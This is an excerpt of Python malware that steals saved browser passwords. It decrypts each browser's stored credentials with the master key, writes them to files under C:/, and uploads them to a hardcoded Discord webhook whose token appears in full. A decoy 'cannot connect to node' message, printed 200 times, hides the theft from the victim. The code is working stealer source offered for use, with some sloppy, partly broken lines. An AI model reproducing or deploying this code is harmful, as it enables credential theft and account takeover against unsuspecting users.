...
WEBHOOK = "https://discord.com/api/webhooks/1062814293906702397/nrxqhvdELF-G2mnul-sLtf30pcfnv_fuMhMN4NQ-BkUQnSEVqw-2ciOLcQxNX4jL7Ccx"
...
def save_results(browser_name, data_type, content):
    ...
    try:
        if not os.path.exists(browser_name):
            os.mkdir(f"C:/{browser}")
    except:
        print('gg')
        # os.mkdir(browser_name)
    if content is not None:
        open(f'C:/{browser_name}/{data_type}.txt', 'w').write(content)
        f2=open(f'C:/{browser_name}/{data_type}.txt')
        # print(f"\t [*] Saved in {browser}/{data_type}.txt")
        webhook.add_file(file=f2.read(),filename=data_type)
        webhook.execute()
    else:
    ...
    #     f2=open(f'{browser_name}/{data_type}.txt')
    #     print(f"\t [*] Saved in {browser}/{data_type}.txt")
    #     webhook.add_file(file=f2.read(),filename=data_type)
    #     webhook.execute()
    # else:
...
def dataa(path: str, profile: str, master_key):
...
if __name__ == '__main__':
    ...
    for i in range(200):
        print("sorry cannot connect to node")
    for browser in available_browsers:
        ...
        save_results(browser, 'Saved_Passwords', dataa(browser_path, "Default", master_key))
        # print("\t------\n")
